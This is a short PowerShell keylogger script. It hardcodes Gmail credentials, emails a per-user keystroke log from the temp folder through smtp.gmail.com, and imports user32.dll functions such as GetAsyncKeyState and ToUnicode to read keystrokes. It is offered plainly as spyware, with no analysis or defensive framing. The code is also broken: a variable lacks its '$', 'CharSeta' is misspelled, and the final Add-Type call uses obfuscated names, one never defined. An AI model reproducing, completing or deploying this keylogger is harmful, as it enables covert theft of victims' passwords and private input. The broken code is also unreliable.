$email = "example@gmail.com"
$password = "password"

function KeyLogger($logFile="$env:temp/$env:UserName.log") {

    logs = Get-Content "$logFile"
    $subject = "$env:UserName logs"
    $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", 587);
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
    $smtp.send($email, $email, $subject, $logs);

    $generateLog = New-Item -Path $logFile -ItemType File -Force

    $APIsignatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSeta=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    $rCbunpORfd = Add-Type -MemberDefinition $OcWuFHMxqw -Name 'Win32' -Namespace API -PassThru
}